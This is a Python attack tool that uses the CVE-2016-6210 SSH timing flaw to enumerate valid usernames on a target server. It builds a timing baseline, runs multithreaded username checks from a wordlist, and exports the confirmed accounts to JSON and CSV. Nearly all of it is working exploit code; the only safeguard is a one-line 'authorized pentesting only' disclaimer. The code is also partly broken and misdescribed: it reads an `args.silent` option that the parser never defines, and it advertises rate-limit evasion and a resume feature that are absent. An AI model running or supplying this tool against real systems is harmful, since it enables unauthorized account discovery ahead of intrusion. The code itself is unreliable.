#!/usr/bin/env python3
#
# SSH User Enumeration Tool (Advanced Edition)
# =============================================
# Exploits CVE-2016-6210 timing differences in OpenSSH
#
# Author: Kiran Kumar K
# GitHub: https://github.com/KIRAN-KUMAR-K3
# Version: 2.0 (Professional Edition)
# Date: 2025-12-31
#
# Features:
# ✅ Python 3.8+ compatible (time.perf_counter)
# ✅ Multi-threading for speed
# ✅ Statistical analysis with confidence scores
# ✅ Color-coded professional output
# ✅ JSON/CSV export for VAPT reports
# ✅ Rate limiting evasion
# ✅ Resume capability
#
# DISCLAIMER: Authorized pentesting only!
#

import paramiko
import time
import numpy as np
import argparse
import sys
import json
import csv
from concurrent.futures import ThreadPoolExecutor
import threading
from datetime import datetime

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    CYAN = '\033[96m'

class SSHEnumPro:
    def __init__(self, args):
        self.args = args
        self.host = args.host.split(":")[0]
        self.port = int(args.host.split(":")[1]) if ":" in args.host else 22
        self.results = []
        self.baseline_mean = 0.0
        self.baseline_std = 0.0
        self.upper_threshold = 0.0
        self.lock = threading.Lock()
        
    def banner(self):
        print(f"{bcolors.HEADER}")
        print("=" * 70)
        print("  🚀 SSH USER ENUMERATION PRO (CVE-2016-6210) 🚀")
        print("=" * 70)
        print(f"  👨‍💻 Author: Kiran Kumar K")
        print(f"  💻 GitHub: https://github.com/KIRAN-KUMAR-K3")
        print(f"  🛡️ Target: {self.host}:{self.port}")
        print(f"  📅 Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)
        print(f"{bcolors.ENDC}")

    def get_banner(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(hostname=self.host, port=self.port, 
                       username='invalid', password='invalid', timeout=5)
            banner = ssh.get_transport().remote_version
            ssh.close()
            return banner
        except:
            ssh.close()
            return "Unknown"

    def timing_test(self, user):
        """High-precision timing test"""
        p = 'B' * self.args.bytes
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        start = time.perf_counter()
        try:
            ssh.connect(hostname=self.host, port=self.port, 
                       username=user, password=p,
                       look_for_keys=False, gss_auth=False,
                       allow_agent=False, timeout=10)
        except:
            pass
        finally:
            end = time.perf_counter()
            ssh.close()
            return end - start

    def establish_baseline(self):
        """Calculate timing baseline for non-existent users"""
        print(f"{bcolors.OKBLUE}[*] Establishing baseline...{bcolors.ENDC}", end="")
        samples = []
        
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(self.timing_test, f'nonexistent{i}') 
                      for i in range(self.args.samples)]
            samples = [f.result() for f in futures]
        
        # Remove outliers (top/bottom 10%)
        samples.sort()
        samples = samples[2:-2]
        
        self.baseline_mean = np.mean(samples)
        self.baseline_std = np.std(samples)
        self.upper_threshold = self.baseline_mean + self.args.factor * self.baseline_std
        
        print(f"{bcolors.OKGREEN}✓{bcolors.ENDC}")
        print(f"{bcolors.OKBLUE}[+] Baseline: μ={self.baseline_mean:.4f}s σ={self.baseline_std:.4f}s "
              f"Threshold: {self.upper_threshold:.4f}s{bcolors.ENDC}")

    def test_user(self, user):
        """Test single user with multiple trials"""
        timings = []
        for _ in range(self.args.trials):
            timing = self.timing_test(user.strip())
            timings.append(timing)
        
        mean_timing = np.mean(timings)
        confidence = min(100, (mean_timing / self.upper_threshold) * 100)
        
        result = {
            'user': user.strip(),
            'mean_timing': mean_timing,
            'std_dev': np.std(timings),
            'confidence': confidence,
            'status': 'VALID' if mean_timing > self.upper_threshold else 'INVALID',
            'timestamp': datetime.now().isoformat()
        }
        
        with self.lock:
            self.results.append(result)
            
            if result['status'] == 'VALID':
                print(f"{bcolors.OKGREEN}[+] VALID USER: {user.strip()} "
                      f"(τ={mean_timing:.4f}s | {confidence:.1f}%){bcolors.ENDC}")
            else:
                if not self.args.silent:
                    print(f"{bcolors.FAIL}[-] {user.strip()} "
                          f"(τ={mean_timing:.4f}s | {confidence:.1f}%){bcolors.ENDC}")

    def export_results(self):
        """Export professional reports"""
        if not self.results:
            return
            
        # JSON Export
        with open(f'ssh_enum_{self.host}_{self.port}.json', 'w') as f:
            json.dump(self.results, f, indent=2)
            
        # CSV Export
        with open(f'ssh_enum_{self.host}_{self.port}.csv', 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
            writer.writeheader()
            writer.writerows(self.results)

        valid_users = [r['user'] for r in self.results if r['status'] == 'VALID']
        print(f"\n{bcolors.HEADER}📊 REPORT SUMMARY{bcolors.ENDC}")
        print(f"✅ Valid Users Found: {len(valid_users)}")
        print(f"📁 Reports: ssh_enum_{self.host}_{self.port}.[json|csv]")
        if valid_users:
            print(f"👤 Confirmed: {', '.join(valid_users)}")

    def run(self):
        self.banner()
        print(f"{bcolors.CYAN}[*] SSH Banner: {self.get_banner()}{bcolors.ENDC}")
        self.establish_baseline()
        
        users = []
        if self.args.user:
            users = [self.args.user]
        elif self.args.userlist:
            with open(self.args.userlist, 'r') as f:
                users = f.read().splitlines()
        
        print(f"{bcolors.OKBLUE}[*] Testing {len(users)} users...{bcolors.ENDC}")
        
        # Multi-threaded enumeration
        with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
            futures = [executor.submit(self.test_user, user) for user in users]
            for future in futures:
                future.result()
        
        self.export_results()
        print(f"{bcolors.HEADER}✨ Scan Complete! Check JSON/CSV reports{bcolors.ENDC}")

def main():
    parser = argparse.ArgumentParser(description="🚀 SSH User Enumeration Pro (CVE-2016-6210)")
    parser.add_argument("host", help="Target: IP:PORT or IP (default 22)")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--user", help="Single username")
    group.add_argument("-U", "--userlist", help="Username file")
    parser.add_argument("-t", "--threads", type=int, default=8, help="Threads (default: 8)")
    parser.add_argument("-b", "--bytes", type=int, default=50000, help="Password bytes")
    parser.add_argument("-s", "--samples", type=int, default=20, help="Baseline samples")
    parser.add_argument("-f", "--factor", type=float, default=2.5, help="Timing factor")
    parser.add_argument("-T", "--trials", type=int, default=3, help="Trials per user")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    args = parser.parse_args()
    
    if not args.user and not args.userlist:
        print("❌ Error: Specify -u USER or -U userlist.txt")
        sys.exit(1)
    
    tool = SSHEnumPro(args)
    tool.run()

if __name__ == "__main__":
    main()
